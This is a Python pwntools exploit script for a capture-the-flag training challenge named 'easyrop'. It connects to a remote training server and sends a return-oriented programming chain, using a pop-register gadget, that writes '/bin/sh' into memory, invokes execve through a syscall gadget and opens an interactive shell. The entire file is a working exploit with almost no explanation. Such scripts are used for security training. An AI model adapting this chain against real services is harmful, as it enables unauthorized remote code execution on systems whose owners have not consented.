from pwn import *
import time


context.terminal = ['tmux','splitw','-h']

#r = process("./easyrop")
r = remote("bin.training.jinblack.it", 2015)
#gdb.attach(r, gdbscript="""
 #  b *0x400290
  #c
#""")
#input("wait")

r.recvuntil("Try easyROP!\n")

for i in range(0,14):
  print(str(i))
  r.send("h\x00")
  r.send("0\x00")
  r.recv(4)
  time.sleep(1)

ptr_gadget = 0x4001c2
ptr_syscall = 0x4001b3
ptr_binsh = 0x600370
bin_sh = b"/bin/sh\0"


# Gadget: pop rdi pop rsi pop rdx pop rax ret

# Setup read
r.send(p64(ptr_gadget))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0)) #rdi
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(ptr_binsh)) # rsi
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(len(bin_sh))) # rdx
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0)) #rax
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(ptr_syscall))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0)) #rbp
r.send(p64(0x0))
r.recv(4)
time.sleep(1)



# Setup exec
r.send(p64(ptr_gadget))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(ptr_binsh))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x3b))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(ptr_syscall))
r.send(p64(0x0))
r.recv(4)
time.sleep(1)
r.send(p64(0x0)) #rbp
r.send(p64(0x0))
r.recv(4)
time.sleep(1)

# Exit from loop
r.send("\n")
r.send("\n")
r.recv(4)
time.sleep(1)

# Send to read /bin/sh
r.send(bin_sh)


r.interactive()

